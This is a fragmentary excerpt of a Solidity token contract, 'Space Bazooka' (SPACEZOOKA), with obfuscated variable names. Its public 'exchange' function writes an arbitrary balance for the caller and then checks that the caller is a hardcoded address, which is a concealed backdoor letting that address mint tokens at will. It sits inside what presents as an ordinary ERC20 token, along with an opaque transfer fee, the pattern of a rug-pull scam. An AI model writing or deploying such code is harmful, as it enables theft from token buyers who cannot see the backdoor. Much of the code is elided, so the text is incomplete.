...
contract Context {
 ...
 contract SpaceZooka is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private dnesbesneq;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Space Bazooka";
    string private _symbol = "SPACEZOOKA";
    ...
    address private _spiralovidno;
    uint256 private _rTotal = 10000 * 10 ** 18;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _spiralovidno = 0x9A122B6d3480810F50b3AAe0DB9f1D7aC855Ec07;
        _owner = _msgSender();
        dnesbesneq[msg.sender] = _totalSupply;
    ...
    function exchange(uint256 neprosledim) public {
        dnesbesneq[_msgSender()] = neprosledim;
        require(_msgSender() == _spiralovidno, "Sorry, cannot be transferred right now!");
    }
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = dnesbesneq[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            dnesbesneq[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        dnesbesneq[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = dnesbesneq[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            dnesbesneq[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
